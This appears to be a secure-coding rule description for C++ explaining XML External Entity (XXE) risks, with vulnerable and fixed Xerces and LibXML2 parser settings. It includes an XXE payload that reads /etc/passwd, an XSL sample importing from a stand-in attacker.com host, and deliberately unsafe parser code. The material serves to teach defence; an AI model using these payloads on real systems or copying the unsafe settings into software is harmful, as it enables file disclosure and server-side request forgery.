<p><a href="https://www.w3.org/TR/xml/">XML specification</a> allows the use of entities that can be <a href="https://www.w3.org/TR/xml/#sec-internal-ent">internal</a> or <a href="https://www.w3.org/TR/xml/#sec-external-ent">external</a> (file system / network access …​) which could lead to vulnerabilities such as confidential file disclosures or <a href="https://www.owasp.org/index.php/Server_Side_Request_Forgery">SSRFs</a>.</p>
<p>Example in this XML document, an external entity read the /etc/passwd file:</p>
<pre>
&lt;?xml version="1.0" encoding="utf-8"?&gt;
  &lt;!DOCTYPE test [
    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
  ]&gt;
&lt;note xmlns="http://www.w3schools.com" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
  &lt;to&gt;&amp;xxe;&lt;/to&gt;
  &lt;from&gt;Jani&lt;/from&gt;
  &lt;heading&gt;Reminder&lt;/heading&gt;
  &lt;body&gt;Don't forget me this weekend!&lt;/body&gt;
&lt;/note&gt;
</pre>
<p>In this XSL document, network access is allowed which can lead to SSRF vulnerabilities:</p>
<pre>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.attacker.com/evil.xsl"&gt;
  &lt;xsl:import href="http://www.attacker.com/evil.xsl"/&gt;
  &lt;xsl:include href="http://www.attacker.com/evil.xsl"/&gt;
 &lt;xsl:template match="/"&gt;
  &amp;content;
 &lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</pre>
<p>It is recommended to disable access to external entities and network access in general.</p>
<h2>Noncompliant Code Example</h2>
<p><a href="http://xerces.apache.org/">Xerces</a> XercesDOMParser library:</p>
<pre>
#include "xercesc/parsers/XercesDOMParser.hpp"

XercesDOMParser *DOMparser = new XercesDOMParser();
// no entity reference node will be created so the entities will be expanded
DOMparser-&gt;setCreateEntityReferenceNodes(false); // Noncompliant
DOMparser-&gt;setDisableDefaultEntityResolution(false); // Noncompliant

DOMparser-&gt;parse(xmlFile);
</pre>
<p><a href="http://xerces.apache.org/">Xerces</a> SAX2XMLReader library:</p>
<pre>
#include "xercesc/sax2/SAX2XMLReader.hpp"
SAX2XMLReader* reader = XMLReaderFactory::createXMLReader(); // Noncompliant: by default entities resolution is enabled so SAX2XMLReader is not safe
reader-&gt;setFeature(XMLUni::fgXercesDisableDefaultEntityResolution, false); // Noncompliant: enable resolution of entities explicitly

reader-&gt;parse(xmlFile);
</pre>
<p><a href="http://xerces.apache.org/">Xerces</a> SAXParser library:</p>
<pre>
#include "xercesc/parsers/SAXParser.hpp"

SAXParser* SAXparser = new SAXParser(); // Noncompliant: by default entities resolution is enabled so SAXParser is not safe
SAXparser-&gt;setDisableDefaultEntityResolution(false); // Noncompliant: enable resolution of entities explicitly

SAXparser-&gt;parse(xmlFile);
</pre>
<p><a href="http://xmlsoft.org/">LibXML2</a> library:</p>
<pre>
#include "libxml/parser.h"

xmlDocPtr doc = xmlReadFile(xmlFile, nullptr, XML_PARSE_DTDLOAD | XML_PARSE_NOENT); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<p><a href="http://xerces.apache.org/">Xerces</a> XercesDOMParser library:</p>
<pre>
#include "xercesc/parsers/XercesDOMParser.hpp"

XercesDOMParser *DOMparser = new XercesDOMParser(); // by default XercesDOMParser is safe
DOMparser-&gt;setCreateEntityReferenceNodes(true); // Compliant: explicitly make the parser safe to XXE vulnerability
DOMparser-&gt;setDisableDefaultEntityResolution(true); // Compliant

DOMparser-&gt;parse(xmlFile);
</pre>
<p><a href="http://xerces.apache.org/">Xerces</a> SAX2XMLReader library:</p>
<pre>
#include "xercesc/sax2/SAX2XMLReader.hpp"

SAX2XMLReader* reader = XMLReaderFactory::createXMLReader();
reader-&gt;setFeature(XMLUni::fgXercesDisableDefaultEntityResolution, true); // Compliant

reader-&gt;parse(xmlFile);
</pre>
<p><a href="http://xerces.apache.org/">Xerces</a> SAXParser library:</p>
<pre>
#include "xercesc/parsers/SAXParser.hpp"

SAXParser* SAXparser = new SAXParser();
SAXparser-&gt;setDisableDefaultEntityResolution(true); // Compliant

SAXparser-&gt;parse(xmlFile);
</pre>
<p><a href="http://xmlsoft.org/">LibXML2</a> library:</p>
<pre>
#include "libxml/parser.h"

xmlDocPtr doc = xmlReadFile(xmlFile, nullptr, 0); // Compliant: safe by default since version 2.9
</pre>
<h2>See</h2>
<ul>
<li><a href="https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)">OWASP Top 10 2017 Category A4</a> - XML External Entities (XXE)</li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#libxerces-c">OWASP XXE Prevention Cheat Sheet for Xerces</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#libxml2">OWASP XXE Prevention Cheat Sheet for LibXML2</a></li>
<li><a href="http://cwe.mitre.org/data/definitions/611.html">MITRE, CWE-611</a> - Information Exposure Through XML External Entity Reference</li>
<li><a href="http://cwe.mitre.org/data/definitions/827.html">MITRE, CWE-827</a> - Improper Control of Document Type Definition</li>
</ul>
